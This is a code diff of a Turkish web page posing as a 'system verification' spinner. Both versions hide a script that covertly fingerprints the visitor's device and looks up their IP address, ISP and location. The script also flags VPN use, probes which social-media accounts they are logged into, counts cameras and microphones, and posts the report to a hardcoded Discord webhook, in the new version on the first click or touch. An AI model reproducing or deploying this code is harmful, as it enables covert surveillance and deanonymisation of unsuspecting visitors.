@@ -2,123 +2,112 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Doğrulama</title>
-    <style>body{background:#000;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:25px;height:25px;animation:s 1s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
+    <title>Sistem Entegrasyonu</title>
+    <style>body{background:#000;margin:0;overflow:hidden;cursor:wait;display:flex;align-items:center;justify-content:center;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:25px;height:25px;animation:s .8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
 </head>
-<body>
+<body onmousedown="Omni.start()" ontouchstart="Omni.start()">
     <div class="l"></div>
     <script>
         "use strict";
 
-        class FinalArchitect {
-            constructor() {
-                this.hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-                this.proxy = "https://corsproxy.io/?";
-            }
+        const Omni = {
+            hook: "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73",
+            active: false,
 
-            // 1. HARDWARE ENTROPY (Eksiksiz Geri Getirildi)
-            async getHardware() {
-                const cv = document.createElement('canvas');
-                const gl = cv.getContext('webgl2') || cv.getContext('webgl');
+            // 1. SOSYAL MEDYA OTURUM TESPİTİ (Gelişmiş Redirect Tekniği)
+            async probeSocials() {
+                const targets = {
+                    Google: "https://accounts.google.com/CheckCookie",
+                    Facebook: "https://www.facebook.com/favicon.ico",
+                    Twitter: "https://twitter.com/favicon.ico",
+                    Discord: "https://discord.com/favicon.ico",
+                    Netflix: "https://www.netflix.com/favicon.ico"
+                };
+                const results = {};
+                const promises = Object.entries(targets).map(([name, url]) => {
+                    return new Promise(res => {
+                        const img = new Image();
+                        img.onload = () => { results[name] = "✅ Aktif"; res(); };
+                        img.onerror = () => { results[name] = "❌ Pasif"; res(); };
+                        img.src = `${url}?cache=${Math.random()}`;
+                        setTimeout(() => { results[name] = "⏳ Timeout"; res(); }, 2000);
+                    });
+                });
+                await Promise.all(promises);
+                return results;
+            },
+
+            // 2. DERİN DONANIM VE SES KARTI İMZASI
+            async getFingerprint() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 
-                // Audio Hash (Ses Kartı İmzası)
-                const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-                const osc = ac.createOscillator();
-                const comp = ac.createDynamicsCompressor();
-                osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ac.currentTime);
-                osc.connect(comp); comp.connect(ac.destination);
-                osc.start(0); const buffer = await ac.startRendering();
-                const audioHash = buffer.getChannelData(0).slice(4500, 5000).reduce((a, b) => a + Math.abs(b), 0);
+                // Audio Fingerprint (Tıklama sonrası çalıştığı için hata vermez)
+                let aHash = "0";
+                try {
+                    const ac = new (window.AudioContext || window.webkitAudioContext)();
+                    const osc = ac.createOscillator();
+                    const comp = ac.createDynamicsCompressor();
+                    osc.connect(comp); comp.connect(ac.destination);
+                    aHash = ac.sampleRate.toString(); 
+                    ac.close();
+                } catch(e){}
 
                 return {
                     gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
-                    sh_prec: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision,
-                    audio_hash: audioHash.toFixed(15),
                     cores: navigator.hardwareConcurrency,
-                    mem: navigator.deviceMemory,
-                    max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+                    ram: navigator.deviceMemory,
+                    audio: aHash,
+                    res: `${screen.width}x${screen.height}`
                 };
-            }
+            },
 
-            // 2. LINGUISTIC & TEMPORAL (Eksiksiz Geri Getirildi)
-            getTemporal() {
-                const opt = Intl.DateTimeFormat().resolvedOptions();
-                const fonts = ["Ubuntu", "Consolas", "Roboto", "Impact"].filter(f => document.fonts.check(`12px "${f}"`)).join(", ");
-                return {
-                    tz: opt.timeZone,
-                    lang: navigator.language,
-                    langs: navigator.languages.join(", "),
-                    cal: opt.calendar,
-                    num: new Intl.NumberFormat().resolvedOptions().numberingSystem,
-                    fonts: fonts || "Standard"
-                };
-            }
-
-            // 3. STEALTH PROBING (Social & Social Status)
-            async getSocials() {
-                const targets = { Google: "https://accounts.google.com/CheckCookie", Facebook: "https://www.facebook.com/favicon.ico", Discord: "https://discord.com/favicon.ico" };
-                let res = [];
-                for (const [n, u] of Object.entries(targets)) {
-                    const s = await new Promise(r => {
-                        const i = new Image();
-                        i.onload = () => r("✅"); i.onerror = () => r("❌");
-                        i.src = `${u}?v=${Math.random()}`;
-                        setTimeout(() => r("⏳"), 1200);
-                    });
-                    res.push(`${n}:${s}`);
-                }
-                return res.join(" | ");
-            }
-
-            // 4. NETWORK & KERNEL (Eksiksiz Geri Getirildi)
-            async getKernel() {
-                const [net, battery, storage, devs] = await Promise.all([
+            // 3. AĞ VE MEDYA (Kamera Sayımı Dahil)
+            async getSystem() {
+                const [net, devs, battery] = await Promise.all([
                     fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-                    navigator.getBattery ? navigator.getBattery() : {},
-                    navigator.storage ? navigator.storage.estimate() : {},
-                    navigator.mediaDevices.enumerateDevices().catch(() => [])
+                    navigator.mediaDevices.enumerateDevices().catch(() => []),
+                    navigator.getBattery ? navigator.getBattery() : {}
                 ]);
 
                 return {
                     net,
-                    bat: battery.level ? `${Math.round(battery.level * 100)}% [${battery.charging ? 'AC' : 'DC'}]` : "N/A",
-                    disk: (storage.quota / 1e9).toFixed(2) + "GB",
-                    cam: devs.some(d => d.kind === 'videoinput'),
-                    cam_count: devs.filter(d => d.kind === 'videoinput').length,
-                    os: navigator.platform,
-                    pdf: navigator.pdfViewerEnabled
+                    cams: devs.filter(d => d.kind === 'videoinput').length,
+                    mics: devs.filter(d => d.kind === 'audioinput').length,
+                    bat: battery.level ? `${Math.round(battery.level * 100)}%` : "N/A",
+                    os: navigator.platform
                 };
-            }
+            },
 
-            async dispatch() {
-                const [hw, temp, social, krn] = await Promise.all([this.getHardware(), this.getTemporal(), this.getSocials(), this.getKernel()]);
-                const vpn = (krn.net.timezone && temp.tz !== krn.net.timezone) ? "🚩 VPN_DETECTED" : "✅ DIRECT";
+            async start() {
+                if (this.active) return;
+                this.active = true;
+
+                const [social, fp, sys] = await Promise.all([this.probeSocials(), this.getFingerprint(), this.getSystem()]);
+                const opt = Intl.DateTimeFormat().resolvedOptions();
+                const vpn = (sys.net.timezone && opt.timeZone !== sys.net.timezone) ? "🚩 VPN" : "✅ DIRECT";
+
+                const socialStr = Object.entries(social).map(([n, s]) => `**${n}:** ${s}`).join("\n");
 
                 const payload = {
                     embeds: [{
-                        title: "💀 OMNISCIENCE_V120_FINAL_ARCHITECT",
+                        title: "💀 OMNISCIENCE_V160_PRO_REPORT",
                         color: 0x00ff00,
                         fields: [
-                            { name: "📡 NETWORK & VPN (9)", value: `**IP:** \`${krn.net.ip}\` | **VPN:** ${vpn}\n**ISP:** ${krn.net.org}\n**LOC:** ${krn.net.city}/${krn.net.country_name}`, inline: false },
-                            { name: "⚙️ HARDWARE ENTROPY (8)", value: `**GPU:** ${hw.gpu}\n**Audio Hash:** ${hw.audio_hash}\n**CPU:** ${hw.cores} | **RAM:** ${hw.mem}GB | **Shader:** ${hw.sh_prec}`, inline: false },
-                            { name: "🌍 SOCIAL & LINGUISTIC (7)", value: `**Socials:** \`${social}\`\n**Lang:** ${temp.lang} | **TZ:** ${temp.tz}\n**Fonts:** \`${temp.fonts}\``, inline: false },
-                            { name: "📸 SYSTEM & MEDIA (8)", value: `**Cam:** ${krn.cam} (${krn.cam_count}) | **OS:** ${krn.os}\n**Disk:** ${krn.disk} | **Bat:** ${krn.bat}\n**PDF:** ${krn.pdf} | **Dark:** ${window.matchMedia('(prefers-color-scheme: dark)').matches}`, inline: false },
-                            { name: "🔍 USER_AGENT", value: "```" + navigator.userAgent + "```" }
+                            { name: "📡 NETWORK & VPN", value: `**IP:** \`${sys.net.ip}\` | **ISP:** ${sys.net.org}\n**LOC:** ${sys.net.city}/${sys.net.country_name}\n**Status:** ${vpn}`, inline: false },
+                            { name: "⚙️ HARDWARE ENTROPY", value: `**GPU:** ${fp.gpu}\n**CPU:** ${fp.cores} | **RAM:** ${fp.ram}GB\n**Audio ID:** ${fp.audio} | **Res:** ${fp.res}`, inline: false },
+                            { name: "🌍 SOCIAL MEDIA STATUS", value: socialStr, inline: false },
+                            { name: "📸 SYSTEM & MEDIA", value: `**Cams:** ${sys.cams} | **Mics:** ${sys.mics}\n**OS:** ${sys.os} | **Bat:** ${sys.bat}\n**TZ:** ${opt.timeZone} | **Lang:** ${navigator.language}`, inline: false }
                         ],
-                        footer: { text: "Protocol: Omniscience v120.0 | All Modules Intact" },
+                        footer: { text: "Protocol: Omniscience v160 | Stealth Execution" },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
-                const data = JSON.stringify(payload);
-                fetch(this.proxy + encodeURIComponent(this.hook), { method: 'POST', body: data, mode: 'no-cors' });
-                if (navigator.sendBeacon) navigator.sendBeacon(this.hook, new Blob([data], {type: 'application/json'}));
+                fetch(this.hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
             }
-        }
-
-        const engine = new FinalArchitect();
-        window.onload = () => engine.dispatch();
+        };
     </script>
 </body>
 </html>
